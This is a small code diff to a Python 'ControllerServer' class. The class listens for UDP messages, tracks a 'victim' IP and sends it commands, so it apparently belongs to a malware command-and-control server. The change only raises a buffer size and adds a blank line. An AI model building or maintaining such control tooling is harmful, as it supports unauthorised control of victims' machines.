@@ -83,7 +83,7 @@ class ControllerServer:
             except Exception as e:
                 pass
 
-    def listen_clients(self, buffer_size: int = 4096):
+    def listen_clients(self, buffer_size: int = 8192):
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind(('0.0.0.0', self.port_listen))
@@ -98,6 +98,7 @@ class ControllerServer:
                     data_str = data.get("message", "")
                     signal = data.get("signal", False)
                     ip_victim = data.get("from_ip", None)
+
                     if self.ip_victim is None or self.ip_victim != ip_victim:
                         self.ip_victim = ip_victim
                         self.send_command(message="Server_active")
